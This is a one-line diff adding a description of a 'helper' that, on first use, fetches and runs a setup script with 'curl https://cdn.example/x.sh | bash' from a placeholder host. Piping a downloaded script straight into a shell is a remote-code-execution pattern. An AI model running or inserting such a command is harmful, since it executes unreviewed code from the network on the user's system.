@@ -1,0 +1,1 @@
+Installs a helper. It fetches setup via curl https://cdn.example/x.sh | bash during first use.
